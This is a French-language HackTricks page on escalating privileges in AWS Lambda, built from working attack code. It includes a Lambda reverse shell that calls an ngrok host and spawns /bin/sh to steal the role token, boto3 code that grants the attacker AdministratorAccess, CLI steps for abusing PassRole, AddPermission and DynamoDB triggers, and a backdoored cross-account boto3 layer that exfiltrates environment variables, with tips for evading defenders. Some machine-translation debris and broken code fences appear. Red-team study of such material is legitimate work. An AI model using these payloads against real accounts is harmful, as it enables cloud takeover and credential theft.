# AWS - Lambda Privesc

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## lambda

Plus d'informations sur lambda dans :

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Un utilisateur avec les permissions **`iam:PassRole`, `lambda:CreateFunction`,** et **`lambda:InvokeFunction`** peut **escalader les privil√®ges en passant un r√¥le IAM existant √† une nouvelle fonction Lambda** qui inclut du code pour importer la biblioth√®que AWS pertinente √† leur langage de programmation de choix, puis l'utiliser pour effectuer les actions de leur choix. Le code pourrait ensuite √™tre ex√©cut√© en invoquant la fonction via l'API AWS.

Un attaquant pourrait abuser de cela pour obtenir un **rev shell et voler le jeton** :

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
Le contenu fourni ne contient pas de texte √† traduire. Veuillez fournir le texte anglais pertinent pour la traduction en fran√ßais.
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Vous pourriez √©galement **abuser des permissions du r√¥le lambda** depuis la fonction lambda elle-m√™me.\
Si le r√¥le lambda disposait de suffisamment de permissions, vous pourriez l'utiliser pour vous octroyer des droits d'administrateur :
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service lambda sp√©cifi√© arbitrairement.

{% hint style="danger" %}
Notez que m√™me si cela peut para√Ætre int√©ressant, **`lambda:InvokeAsync`** **ne permet pas** √† lui seul d'**ex√©cuter `aws lambda invoke-async`**, vous avez √©galement besoin de `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Comme dans le sc√©nario pr√©c√©dent, vous pouvez **vous octroyer la permission `lambda:InvokeFunction`** si vous avez la permission **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impact potentiel :** Privesc direct au r√¥le de service lambda sp√©cifi√© arbitrairement.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Un utilisateur avec les permissions **`iam:PassRole`, `lambda:CreateFunction` et `lambda:CreateEventSourceMapping`** (et possiblement `dynamodb:PutItem` et `dynamodb:CreateTable`), mais **sans** la permission `lambda:InvokeFunction`, peut escalader ses privil√®ges en **passant un r√¥le IAM existant √† une nouvelle fonction Lambda** qui inclut du code pour importer la biblioth√®que AWS pertinente dans leur langage de programmation de choix, puis l'utiliser pour effectuer les actions de leur choix. Ils devront ensuite soit **cr√©er une table DynamoDB ou utiliser une existante**, pour **cr√©er un mappage de source d'√©v√©nement pour la fonction Lambda pointant vers cette table DynamoDB**. Ensuite, ils devront soit ins√©rer un √©l√©ment dans la table soit attendre une autre m√©thode pour le faire afin que la **fonction Lambda soit invoqu√©e**.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
O√π le **code** dans le fichier python **utiliserait le r√¥le cibl√©**. Un exemple serait le m√™me script utilis√© dans la m√©thode pr√©c√©dente.

Apr√®s cela, l'√©tape suivante d√©pend de **si DynamoDB est utilis√©** dans l'environnement AWS actuel. **Si** c'est le cas, tout ce qu'il faut faire est de **cr√©er le mappage de source d'√©v√©nement** pour la fonction Lambda, mais sinon, alors l'attaquant devra **cr√©er une table avec le streaming activ√©** avec la commande suivante :
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Apr√®s cette commande, l'attaquant va **connecter la fonction Lambda et la table DynamoDB** en **cr√©ant un mappage de source d'√©v√©nement** avec la commande suivante :
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Maintenant que la fonction Lambda et le flux sont connect√©s, l'attaquant peut **invoquer la fonction Lambda en d√©clenchant le flux DynamoDB**. Cela peut √™tre fait en ins√©rant un √©l√©ment dans la table DynamoDB, ce qui d√©clenchera le flux, en utilisant la commande suivante :
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
√Ä ce stade, la fonction Lambda sera invoqu√©e, et l'attaquant deviendra administrateur du compte AWS.

**Impact potentiel :** √âl√©vation de privil√®ges directe vers le r√¥le de service Lambda sp√©cifi√©.

### `lambda:AddPermission`

Un attaquant disposant de cette permission peut **s'octroyer (ou octroyer √† d'autres) n'importe quelle permission** (cela g√©n√®re des politiques bas√©es sur les ressources pour accorder l'acc√®s √† la ressource) :

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impact potentiel :** Privesc direct au r√¥le de service lambda utilis√© en accordant la permission de modifier le code et de l'ex√©cuter.

### `lambda:AddLayerVersionPermission`

Un attaquant avec cette permission peut **s'accorder √† lui-m√™me (ou √† d'autres) la permission `lambda:GetLayerVersion`**. Il pourrait acc√©der √† la couche et rechercher des vuln√©rabilit√©s ou des informations sensibles

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
```markdown
{% endcode %}

**Impact potentiel :** Acc√®s potentiel √† des informations sensibles.

### `lambda:UpdateFunctionCode`

Un attaquant disposant de la permission **`lambda:UpdateFunctionCode`** pourrait **mettre √† jour le code d'une fonction Lambda existante avec un r√¥le IAM attach√©** de sorte qu'elle importerait la biblioth√®que AWS pertinente dans ce langage de programmation et l'utiliserait pour effectuer des actions au nom de ce r√¥le. Ils devraient ensuite **attendre qu'elle soit invoqu√©e s'ils ne pouvaient pas le faire directement**, mais si elle existe d√©j√†, il est probable qu'il y ait un moyen qu'elle le soit.
```
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
O√π le fichier **.zip associ√© contient du code qui utilise le r√¥le de Lambda**. Un exemple pourrait inclure le fragment de code des m√©thodes pr√©c√©dentes.

**Impact potentiel :** Privesc direct au r√¥le de service lambda utilis√©.

### `lambda:UpdateFunctionConfiguration`

#### Introduction

[**Les couches Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permettent d'inclure du **code** dans votre fonction lambda mais de le **stocker s√©par√©ment**, de sorte que le code de la fonction puisse rester petit et que **plusieurs fonctions puissent partager du code**.

Dans lambda, vous pouvez v√©rifier les chemins √† partir desquels le code python est charg√© avec une fonction comme la suivante :
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ces emplacements sont :

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Par exemple, la biblioth√®que boto3 est charg√©e depuis `/var/runtime/boto3` (4e position).

#### Exploitation

**Attacher une couche √† une fonction** n√©cessite uniquement la permission `lambda:UpdateFunctionConfiguration` et **les couches peuvent √™tre partag√©es entre comptes**. Nous devons √©galement savoir **quelles biblioth√®ques ils utilisent**, afin de pouvoir les remplacer correctement, mais dans cet exemple, nous allons juste **supposer que la fonction attaqu√©e importe boto3**.

Pour √™tre s√ªr, nous allons utiliser Pip pour installer la m√™me version de la biblioth√®que boto3 que celle utilis√©e par l'environnement d'ex√©cution Lambda que nous ciblons (Python 3.7), afin qu'il n'y ait rien de diff√©rent qui pourrait causer des probl√®mes dans la fonction cible. Cet environnement d'ex√©cution utilise actuellement la version 1.9.42 de boto3.

Avec le code suivant, nous installerons la version 1.9.42 de boto3 et ses d√©pendances dans un dossier local "lambda\_layer" :
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
Ensuite, nous ouvrirons `/lambda_layer/boto3/__init__.py` et ajouterons le code malveillant. Le payload que nous allons ajouter ressemble √† ceci :

![](<../../../.gitbook/assets/image (26).png>)

`requests` est import√© depuis `botocore`. La fonction va exfiltrer les variables d'environnement, et le try-except avec un d√©lai d'attente de 0.1 sont l√† pour s'assurer que ce code ne casse rien.

{% hint style="info" %}
**Note importante :** Vous ne devriez plus utiliser `from botocore.vendored import requests` dans de vrais pentests, car un "DeprecationWarning" sera imprim√© dans les logs CloudWatch de cette fonction, ce qui risque de vous faire rep√©rer par un d√©fenseur.
{% endhint %}

Maintenant, regroupez ce code dans un **fichier ZIP** et **t√©l√©versez-le** dans une **nouvelle couche Lambda dans le compte de l'ATTAQUANT**. Vous devrez d'abord cr√©er un dossier "python" et y mettre vos biblioth√®ques afin que, une fois t√©l√©vers√© sur Lambda, le code se trouve dans "/opt/python/boto3". Assurez-vous √©galement que la couche est compatible avec Python 3.7 et que **la couche est dans la m√™me r√©gion que notre fonction cible**. Une fois cela fait, nous utiliserons `lambda:AddLayerVersionPermission` pour **rendre la couche publiquement accessible** afin que notre compte cible puisse l'utiliser. Utilisez vos identifiants AWS personnels pour cet appel d'API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Avec les **identifiants compromis** que nous avons, nous ex√©cuterons la commande suivante sur notre fonction Lambda cible "s3-getter", qui va **attacher notre couche Lambda inter-comptes**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
La prochaine √©tape serait soit d'**invoquer la fonction** nous-m√™mes si nous le pouvons, soit d'attendre qu'elle soit **invoqu√©e** par des moyens normaux, ce qui est la m√©thode la plus s√ªre.

Une **mani√®re plus discr√®te d'exploiter cette vuln√©rabilit√©** peut √™tre trouv√©e dans :

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impact Potentiel :** √âl√©vation de privil√®ges directe au r√¥le de service lambda utilis√©.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Peut-√™tre qu'avec ces permissions, vous √™tes capable de cr√©er une fonction et de l'ex√©cuter en appelant l'URL... mais je n'ai pas trouv√© de moyen de le tester, alors faites-le moi savoir si vous y parvenez !

### Lambda MitM

Certaines lambdas vont **recevoir des informations sensibles des utilisateurs dans les param√®tres.** Si vous obtenez un RCE dans l'une d'elles, vous pouvez exfiltrer les informations que les autres utilisateurs lui envoient, v√©rifiez-le dans :

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
